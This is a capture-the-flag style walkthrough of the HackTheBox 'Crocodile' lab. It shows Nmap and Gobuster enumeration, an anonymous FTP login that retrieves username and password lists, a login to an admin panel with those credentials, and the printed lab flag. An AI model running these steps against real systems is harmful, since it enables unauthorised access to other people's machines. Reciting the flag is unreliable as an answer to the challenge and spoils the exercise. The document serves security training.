---
title: "HackTheBox Starting Point: Crocodile Walkthrough"
description: ''
date: 2025-02-08
tags: ["Web Exploitation","Anonymous Access","FTP"]
image: '/public/static/htb-cover.jpg'
authors: ['chjwoo']
---

In this walkthrough, we exploit a misconfigured vsFTPd 3.0.3 service and weak credentials to gain initial access and retrieve sensitive information, including a flag.

## Reconnaissance

We begin by scanning the target `10.129.75.248` with Nmap to identify open ports and running services.

```sql
└─$ sudo nmap -sV -sC 10.129.75.248
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 13:10 WIB
Nmap scan report for 10.129.75.248
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.9
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.90 seconds

```

### Analysis of Scan Results

- Port `21` (FTP) is open, running `vsFTPd 3.0.3`.
- Anonymous login is enabled, meaning we can access files without credentials.
- Port `80` (HTTP) is open, hosting an Apache web server.

### Exploring FTP for Credential Discovery

Since anonymous FTP login is allowed, we connect and check for files:

```sql
└─$ ftp 10.129.75.248
Connected to 10.129.75.248.
220 (vsFTPd 3.0.3)
Name (10.129.75.248:w1thre): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||49415|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||45473|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |************************************************|    33       81.58 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.12 KiB/s)
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||44218|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |************************************************|    62      181.82 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (0.22 KiB/s)
ftp> exit
221 Goodbye.

```

Examining the files:

```sql
┌──(w1thre㉿hackbox)-[/mnt/…/cybersec/hackthebox/starting_point/crocodile]
└─$ ls 
allowed.userlist  allowed.userlist.passwd
                                                                                             
┌──(w1thre㉿hackbox)-[/mnt/…/cybersec/hackthebox/starting_point/crocodile]
└─$ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
                                                                                             
┌──(w1thre㉿hackbox)-[/mnt/…/cybersec/hackthebox/starting_point/crocodile]
└─$ cat allowed.userlist.passwd 
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

This suggests possible usernames and passwords for the system.

### Enumerate Website Directory

When we open the website, it will look like this:

![image.png](image.png)

Seems nothing we can do much in this page. We can run `Gobuster` to find hidden directories:

```sql
└─$ gobuster dir --url http://10.129.75.248/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.75.248/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 58565]
/login.php            (Status: 200) [Size: 1577]
/assets               (Status: 301) [Size: 315] [--> http://10.129.75.248/assets/]

```

The presence of `login.php` suggests a login panel. Using the `usernames` and `passwords` from the FTP server, we attempt logging in.

## Foothold

Looking forward to `login.php` page, we can use the credentials that we’ve got before `admin:rKXM59ESxesUFHAd` 

![image.png](image%201.png)

After we successfully log in, we can get the flag.

![image.png](image%202.png)

## Flag

```bash
c7110277ac44d78b6a9fff2232434d16
```